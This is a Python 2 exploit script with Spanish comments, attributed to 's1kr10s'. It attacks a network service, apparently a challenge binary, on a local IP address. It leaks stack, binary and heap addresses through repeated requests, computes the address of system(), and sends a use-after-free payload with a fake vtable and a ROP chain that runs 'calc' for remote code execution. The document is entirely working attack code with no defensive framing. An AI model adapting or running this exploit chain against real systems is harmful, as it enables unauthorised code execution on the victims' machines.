import socket
import struct
from time import sleep
#By Miguel MZ - s1kr10s

host = "192.168.18.229"
addr_func = 0x9854326D  # Direccion de funcion a calcular

def connection(port):
    print '[+] Init Connection {0}:{1}'.format(host, port)
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    con.connect((host, port))
    return con

# Solo utilizo para invertir la direccion de memoria
def reverser(leak):
    memory = leak[14:16]
    memory += leak[12:14]
    memory += leak[10:12]
    memory += leak[8:10]
    memory += leak[6:8]
    memory += leak[4:6]
    memory += leak[2:4]
    memory += leak[:2]
    mem_int = struct.pack('<Q', int(memory, 16))
    return struct.unpack('<Q', mem_int)[0]

con_first = connection(8888)

print '[+] Getting Memory Leak...'
for i in range(208):

    # cuando termine de filtar que asigne 0x88 a rax para salir del ciclo
    if i == 207:
        # termina primera conexion 8888
        payload = struct.pack('<Q', 0x8800000001)
        con_first.send(payload + '\n')
        break
    else:
        # multiplicamos 0x20 por indice para cada vuelta y es utilizado como desplazamiento de memoria para send()
        payload = struct.pack('<Q', 0x2000000001 * i)
        con_first.send(payload + '\n')
        sleep(0.3)
        leak = con_first.recv(32)
        print '     [*] Leak {}: {}'.format(i, leak.encode('hex'))

        # filtramos solo las lineas con leak utilizables como stack, retorno y chunk
        if i == 54:
            off_stack = reverser(leak.encode('hex')[46:62])
        if i == 62:
            addr_binary = reverser(leak.encode('hex')[14:30])
        if i == 204:
            addr_chunk = reverser(leak.encode('hex')[30:46])

imagebase = addr_binary - 0x17801               # calculo de ImageBaseAddress
p_stack_vtable = off_stack - 0x1698             # solo si necesitamos ejecutar una funcion de la VTable desde inicio
p_stack_vtable_function = addr_chunk + 0x100b0  # solo si necesitamos ejecutar punteros dentro de la funcion
ptr_cmd_exec = imagebase + 0x5898               # calculo de funcion system
ptr_calc = p_stack_vtable_function + 248        # calc

print '  [-] Memory Leak Stack: {}'.format(hex(off_stack))
print '  [-] Memory Leak Address return: {}'.format(hex(addr_binary))
print '  [-] Memory Leak ptr Chunk in Heap: {}'.format(hex(addr_chunk))
print '  [-] Size new malloc() UAF: 0x13E8'
print '[+] Calculated offset'
print '  [-] Image Base Address: {}'.format(hex(imagebase))
print '  [-] ptr Fake VTable in Stack: {}'.format(hex(p_stack_vtable))
print '  [-] ptr Function in Fake VTable in Stack: {}'.format(hex(p_stack_vtable_function))
print '  [-] ptr to System: {}'.format(hex(ptr_cmd_exec))
print '  [-] ptr to string Calc: {}'.format(hex(ptr_calc))

sleep(2)

con_second = connection(4930)
leak_GetTickCount = struct.unpack('<i', con_second.recv(8))[0]
print '  [-] Memory Leak GetTickCount: {}'.format(hex(leak_GetTickCount))

''' --- LOGICA DE ROP ---
- hago un stack pivot a los a ROP donde esta mi funcion falsa de vtable
  xchg rsp, rcx / add rsp, 28h / retn

- guardo el puntero a calc en rcx
  pop rcx / add [rax],al / add rsp, 38h / retn
  
- guardo el puntero a system desde funcion a rbx
  pop rbx / retn

- muevo el puntero a system a rax para su copia
  mov rax,rbx / add rsp,20h / pop rbx / retn

- aprovechando el pop rbx de la instruccion anterior guardo la direccion de stack original
  pop rbx
    
- hago una copia del puntero a system en la direccion del stack original
  mov [rbx],rax / add rsp,20h / pop rbx / retn

- por ultimo paso la direccion del stack original a rsp donde se encuentra el puntero a system y salto a ahi
  pop rsp / retn
'''

# RCX contiene el puntero a nuestra funcion (chunk) en Fake VTable
align_stack = struct.pack('<Q', imagebase + 0x1063)     # xchg rsp, rcx / add rsp, 28h
ropero = struct.pack('<Q', imagebase + 0x19DB)          # get prt a calc pop rcx / add [rax],al / add rsp, 38h
ropero += struct.pack('<Q', ptr_calc)                   # ptr calc
ropero += struct.pack('<Q', 0x0000000000000000) * 7     # compensacion para add rsp, 38h
ropero += struct.pack('<Q', imagebase + 0x6576)         # get prt a system pop rbx
ropero += struct.pack('<Q', ptr_cmd_exec)               # ptr a system
ropero += struct.pack('<Q', imagebase + 0x2048)         # movemos ptr system mov rax,rbx / add rsp,20h / pop rbx
ropero += struct.pack('<Q', 0x0000000000000000) * 4     # compensacion para add rsp,20h
ropero += struct.pack('<Q', off_stack)                  # addr de stack original en pop rbx
ropero += struct.pack('<Q', imagebase + 0xBEFC)         # ptr system a stack mov [rbx],rax / add rsp,20h / pop rbx
ropero += struct.pack('<Q', 0x0000000000000000) * 5     # compensacion para add rsp,20h y pop rbx
ropero += struct.pack('<Q', imagebase + 0x7C76)         # pop rsp
ropero += struct.pack('<Q', off_stack)                  # volvemos al stack original y ejecutar system

func_jump = addr_func - leak_GetTickCount
payload = struct.pack('<I', leak_GetTickCount)          # comparacion de valor GetTickCount
payload += struct.pack('<I', func_jump)                 # calculo a jmp function
payload += struct.pack('<Q', 0x0000000000000000)        # compensacion
payload += struct.pack('<I', 0x13E8)                    # size para nuevo malloc UAF 0x13E8
payload += '\x00' * 12                                  # compensacion
payload += struct.pack('<Q', p_stack_vtable_function)   # ptr a fake vftable con desplazamiento de stack + 0x1698
payload += struct.pack('<Q', 0x0000000000000000) * 2    # compensacion
payload += align_stack                                  # offset to ropchain en rax+0x18
payload += struct.pack('<Q', 0x0000000000000000)        # compensacion
payload += ropero                                       # ejecutamos intrucciones de rop para llegar a rce
payload += struct.pack('<Q', 0x0000000000000000)        # compensacion
payload += 'calc\x00\x00\x00\x00'                       # string de calc
con_second.send(payload)
